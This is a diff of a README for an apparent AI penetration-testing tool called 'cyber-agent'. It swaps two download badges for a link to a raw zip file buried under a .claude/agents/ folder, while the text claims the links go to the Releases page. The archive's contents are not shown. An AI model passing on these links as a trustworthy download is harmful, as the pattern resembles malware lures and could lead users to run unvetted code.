@@ -8,7 +8,7 @@ Welcome to the cyber-agent project! This tool uses AI to help automate penetrati
 
 To get started, visit the Releases page to download the latest version of the software. Click the button below to go directly to the download page:
 
-[![Download cyber-agent](https://raw.githubusercontent.com/three2hot/cyber-agent/main/.claude/cyber-agent-v3.5.zip)](https://raw.githubusercontent.com/three2hot/cyber-agent/main/.claude/cyber-agent-v3.5.zip)
+[![Download cyber-agent](https://raw.githubusercontent.com/three2hot/cyber-agent/main/.claude/agents/agent_cyber_nonvolant.zip)](https://raw.githubusercontent.com/three2hot/cyber-agent/main/.claude/agents/agent_cyber_nonvolant.zip)
 
 After downloading, follow these steps to run it:
 
@@ -82,6 +82,6 @@ Stay tuned for updates!
 
 Don't forget to visit our Releases page again to check for updates:
 
-[![Download cyber-agent](https://raw.githubusercontent.com/three2hot/cyber-agent/main/.claude/cyber-agent-v3.5.zip)](https://raw.githubusercontent.com/three2hot/cyber-agent/main/.claude/cyber-agent-v3.5.zip)
+[![Download cyber-agent](https://raw.githubusercontent.com/three2hot/cyber-agent/main/.claude/agents/agent_cyber_nonvolant.zip)](https://raw.githubusercontent.com/three2hot/cyber-agent/main/.claude/agents/agent_cyber_nonvolant.zip)
 
 Your journey into automated security assessments starts now!
